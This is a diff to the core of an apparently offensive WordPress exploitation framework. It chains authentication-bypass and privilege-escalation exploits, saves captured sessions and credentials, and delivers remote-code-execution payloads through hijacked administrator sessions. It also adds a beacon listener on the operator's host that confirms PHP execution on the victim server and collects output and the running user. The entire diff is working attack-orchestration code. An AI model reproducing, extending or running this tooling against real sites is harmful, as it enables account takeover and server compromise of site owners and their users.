@@ -16,7 +16,9 @@ Output rules:
 import re
 import sys
 import traceback
-from lib.exploit import Exploit, resolve_capability
+from lib.exploit import (
+    Exploit, resolve_capability, resolve_capabilities, requires_auth,
+)
 from lib.payload import Payload, resolve_method
 from lib.result import Result
 from lib import output
@@ -66,23 +68,22 @@ def match_payload_to_exploit(exploit_classes, payload_class, xss_adapter=False):
 
     payload_methods = [resolve_method(m) for m in payload_class.methods]
 
-    # First pass: look for direct matches
+    # First pass: direct capability match (rightmost). Multi-capability exploits
+    # match on any of their declared capabilities.
     for i in range(len(exploit_classes) - 1, -1, -1):
-        cap = resolve_capability(exploit_classes[i].capability)
-        if cap in payload_methods:
-            return i, cap, False
+        for cap in resolve_capabilities(exploit_classes[i].capability):
+            if cap in payload_methods:
+                return i, cap, False
 
-    # Second pass: RFI/SSRF exploit + AFU payload → server fallback
+    # Second pass: RFI exploit + AFU payload → framework serves content via HTTP
     for i in range(len(exploit_classes) - 1, -1, -1):
-        cap = resolve_capability(exploit_classes[i].capability)
-        if cap in ("RFI", "SSRF") and "AFU" in payload_methods:
+        if "RFI" in resolve_capabilities(exploit_classes[i].capability) and "AFU" in payload_methods:
             return i, "AFU", True  # method=AFU (get content), but serve via HTTP
 
     # Third pass: XSS→RCE adapter — XSS exploit + RCE payload
     if xss_adapter and "RCE" in payload_methods:
         for i in range(len(exploit_classes) - 1, -1, -1):
-            cap = resolve_capability(exploit_classes[i].capability)
-            if cap == "XSS":
+            if "XSS" in resolve_capabilities(exploit_classes[i].capability):
                 # Payload emits RCE; adapter will convert to XSS JS.
                 return i, "RCE", False
 
@@ -141,12 +142,31 @@ def _wp_login(target, credentials, verbose=0):
         return None
 
 
-def _run_exploit(ecls, target, domain, options, session_cookies, credentials, verbose, instruction):
+def _select_mode(ecls, options):
+    """Choose which declared capability this exploit runs as (multi-capability).
+
+    Operator override via options['as']; otherwise auth-phase caps win
+    (AUTH > PRIVESC), else the first declared delivery/OTHER capability.
+    """
+    caps = resolve_capabilities(ecls.capability)
+    if not caps:
+        return None
+    forced = options.get("as") if options else None
+    if forced and forced in caps:
+        return forced
+    for c in ("AUTH", "PRIVESC"):
+        if c in caps:
+            return c
+    return caps[0]
+
+
+def _run_exploit(ecls, target, domain, options, session_cookies, credentials,
+                 verbose, instruction, mode=None):
     """Run a single exploit with error handling. Returns Result or exits."""
     instance = ecls(
         target=target, domain=domain, options=options,
         session_cookies=session_cookies, credentials=credentials,
-        verbose=verbose,
+        verbose=verbose, mode=mode,
     )
 
     try:
@@ -167,6 +187,84 @@ def _run_exploit(ecls, target, domain, options, session_cookies, credentials, ve
         sys.exit(1)
 
     return result
+
+
+def _run_auth_adapter(payload_class, target, domain, options, session_cookies, credentials, verbose):
+    """Deliver an RCE payload via a stored admin session (no delivery exploit).
+
+    The direct-HTTP twin of the XSS→RCE adapter: uses the stored administrator
+    cookies to drop and trigger the payload through WP-admin sinks.
+    """
+    from lib.auth_adapter import AuthRCEAdapter
+
+    payload_methods = [resolve_method(m) for m in payload_class.methods]
+    if "RCE" not in payload_methods:
+        output.error("--auth-rce-adapter requires an RCE payload (payload must offer RCE).")
+        return []
+
+    role = (credentials or {}).get("role")
+    if role and role != "administrator":
+        output.warn(f"Stored session role is '{role}'. AUTH→RCE sinks need administrator; attempting anyway.")
+
+    payload_instance = payload_class(target=target, domain=domain, options=options, verbose=verbose)
+    payload_instance.method = "RCE"
+    try:
+        instructions = payload_instance.instructions()
+    except Exception:
+        output.error(f"Payload({payload_class.name}) failed with the following error:")
+        traceback.print_exc()
+        sys.exit(1)
+    if instructions is None:
+        instructions = []
+    if isinstance(instructions, str):
+        instructions = [instructions]
+    if not instructions:
+        return []
+
+    beacon_server = None
+    if options.get("lhost"):
+        from lib.beacon_server import BeaconServer
+        beacon_server = BeaconServer(options["lhost"], options.get("lport", "8888"))
+        if not beacon_server.start():
+            beacon_server = None
+
+    adapter = AuthRCEAdapter(target, session_cookies, options, verbose)
+    all_results = []
+    try:
+        output.info("AUTH→RCE adapter: delivering payload via stored admin session…")
+        for instr in instructions:
+            all_results.append(adapter.deliver(instr))
+
+        try:
+            payload_instance.report(all_results)
+        except Exception:
+            output.error(f"Payload({payload_class.name}) failed with the following error:")
+            traceback.print_exc()
+            sys.exit(1)
+
+        if any(r.success for r in all_results):
+            if beacon_server:
+                timeout = int(options.get("beacon-timeout", 120))
+                output.info(f"Waiting up to {timeout}s for server-side beacon…")
+                if beacon_server.wait(timeout=timeout):
+                    data = beacon_server.data or {}
+                    output.success("Beacon received — PHP executed on the server (RCE confirmed)")
+                    if isinstance(data, dict):
+                        if data.get("loader"):
+                            output.success(f"  Loader landed:  {data['loader']}")
+                        if data.get("output"):
+                            output.success(f"  Payload output: {str(data['output'])[:300]}")
+                        if data.get("user"):
+                            output.success(f"  Running as:     {data['user']}")
+                else:
+                    output.warn("No beacon received within timeout (delivery still verified inline).")
+        else:
+            output.error("AUTH→RCE adapter: delivery failed — no admin sink was reachable.")
+            output.warn("The session may lack administrator/upload capability, or all files were blocked.")
+    finally:
+        if beacon_server:
+            beacon_server.stop()
+    return all_results
 
 
 def run_chain(exploit_classes, payload_class, target, domain, options, verbose=0):
@@ -193,51 +291,99 @@ def run_chain(exploit_classes, payload_class, target, domain, options, verbose=0
     if options.get("user") and options.get("pass"):
         credentials = {"user": options["user"], "pass": options["pass"]}
 
-    # ── Phase 2: Separate AUTH exploits from chain exploits ───────────
+    # ── Phase 2: Classify exploits by selected mode ───────────────────
+    # AUTH and PRIVESC run in the auth phase (no payload). Everything else is a
+    # delivery / transformer / OTHER exploit. Multi-capability exploits pick a
+    # mode (operator --as override, else AUTH > PRIVESC > first delivery/OTHER).
     auth_exploits = []
+    privesc_exploits = []
     chain_exploits = []
 
     for ecls in exploit_classes:
-        cap = resolve_capability(ecls.capability)
-        if cap == "AUTH":
+        mode = _select_mode(ecls, options)
+        if mode == "AUTH":
             auth_exploits.append(ecls)
+        elif mode == "PRIVESC":
+            privesc_exploits.append(ecls)
         else:
             chain_exploits.append(ecls)
 
     # ── Phase 3: Run AUTH exploits first ──────────────────────────────
     for ecls in auth_exploits:
+        # Some AUTH exploits escalate an existing low-priv session into a new
+        # (admin) account, so they can themselves require a starting session.
+        if requires_auth(ecls) and not session_cookies:
+            output.error(f"AUTH exploit {ecls.info_str()} needs an existing session to run.")
+            output.error("Provide --cookie / --user+--pass, or chain a prior AUTH exploit.")
+            return []
         result = _run_exploit(
             ecls, target, domain, options,
             session_cookies, credentials, verbose,
-            instruction=None,
+            instruction=None, mode="AUTH",
         )
         _dump_result(result, verbose)
 
-        if result.success:
-            if result.session:
-                session_cookies = result.session
-                store.save_session(domain, session_cookies)
-            if result.credentials:
-                credentials = result.credentials
-                store.save_credentials(domain, credentials)
-        else:
-            # Exploit's self.error() already printed details
+        if not result.success:
+            return []   # exploit's self.error() already printed details
+
+        # An AUTH exploit must produce reusable auth material.
+        if not (result.session or result.credentials):
+            output.error(f"AUTH exploit {ecls.info_str()} succeeded but produced "
+                         "no session or credentials.")
             return []
+        if result.session:
+            session_cookies = result.session
+            store.save_session(domain, session_cookies)
+        if result.credentials:
+            credentials = result.credentials
+            store.save_credentials(domain, credentials)
 
-    # ── Phase 4: AUTH-only run (no chain exploits) ────────────────────
-    if not chain_exploits:
-        return []
-
-    # ── Phase 4.5: Credentials → Session bridge ──────────────────────
-    # If we have credentials but no session cookies, attempt wp-login.php
+    # ── Phase 3.5: Credentials → Session bridge ──────────────────────
+    # If we have credentials but no session cookies, attempt wp-login.php so
+    # PRIVESC and auth-required exploits below have a usable session.
     if credentials and not session_cookies:
         session_cookies = _wp_login(target, credentials, verbose)
         if session_cookies:
             store.save_session(domain, session_cookies)
 
-    # ── Phase 5: Check auth requirements ──────────────────────────────
+    # ── Phase 4: Run PRIVESC exploits (after AUTH, before delivery) ────
+    for ecls in privesc_exploits:
+        if requires_auth(ecls) and not session_cookies:
+            output.error(f"PRIVESC exploit {ecls.info_str()} needs an existing session.")
+            output.error("Chain an AUTH exploit first, or use --cookie / --user+--pass.")
+            return []
+        result = _run_exploit(
+            ecls, target, domain, options,
+            session_cookies, credentials, verbose,
+            instruction=None, mode="PRIVESC",
+        )
+        _dump_result(result, verbose)
+        if not result.success:
+            return []
+        if result.session:
+            session_cookies = result.session
+            store.save_session(domain, session_cookies)
+        if result.credentials:
+            credentials = result.credentials
+            store.save_credentials(domain, credentials)
+
+    # ── Phase 5: Auth-phase-only run (no delivery exploits) ───────────
+    if not chain_exploits:
+        # AUTH→RCE adapter: with a payload but no delivery exploit, deliver the
+        # RCE payload directly using the stored admin session as the vector.
+        auth_adapter = bool(options.get("auth-rce-adapter") or options.get("auth_rce_adapter"))
+        if auth_adapter and payload_class is not None:
+            if not session_cookies:
+                output.error("--auth-rce-adapter needs a stored admin session "
+                             "(use --cookie, --user/--pass, or chain an AUTH exploit).")
+                return []
+            return _run_auth_adapter(payload_class, target, domain, options,
+                                     session_cookies, credentials, verbose)
+        return []
+
+    # ── Auth gate: delivery exploits that need a session ──────────────
     for ecls in chain_exploits:
-        if ecls.auth_required and not session_cookies:
+        if requires_auth(ecls) and not session_cookies:
             output.error(f"Exploit {ecls.info_str()} requires authentication.")
             output.error("Add an AUTH exploit to the chain, use --cookie, or use --user/--pass.")
             return []
@@ -261,7 +407,7 @@ def run_chain(exploit_classes, payload_class, target, domain, options, verbose=0
         xss_adapter
         and matched_method == "RCE"
         and payload_idx is not None
-        and resolve_capability(chain_exploits[payload_idx].capability) == "XSS"
+        and "XSS" in resolve_capabilities(chain_exploits[payload_idx].capability)
     )
 
     # ── Phase 7: Get instructions from payload ────────────────────────
@@ -326,6 +472,10 @@ def run_chain(exploit_classes, payload_class, target, domain, options, verbose=0
     ]
     transformer_classes.reverse()
 
+    # Delivery mode: the payload-matched capability, or (payload-less run) the
+    # exploit's own selected mode (e.g. OTHER standalone).
+    delivery_mode = matched_method if (payload_class and matched_method) else _select_mode(delivery_cls, options)
+
     # ── Phase 8.5: Beacon listener hook ───────────────────────────────
     # When the core XSS→RCE adapter is active and the operator set --lhost,
     # the adapter injected a server-side beacon into the dropped PHP. The
@@ -352,10 +502,11 @@ def run_chain(exploit_classes, payload_class, target, domain, options, verbose=0
             # Pass through transformers (right-to-left)
             current = instruction
             for tcls in transformer_classes:
+                t_caps = resolve_capabilities(tcls.capability)
                 t_result = _run_exploit(
                     tcls, target, domain, options,
                     session_cookies, credentials, verbose,
-                    instruction=current,
+                    instruction=current, mode=(t_caps[0] if t_caps else None),
                 )
                 _dump_result(t_result, verbose)
 
@@ -368,7 +519,7 @@ def run_chain(exploit_classes, payload_class, target, domain, options, verbose=0
             result = _run_exploit(
                 delivery_cls, target, domain, options,
                 session_cookies, credentials, verbose,
-                instruction=current,
+                instruction=current, mode=delivery_mode,
             )
             _dump_result(result, verbose)
 
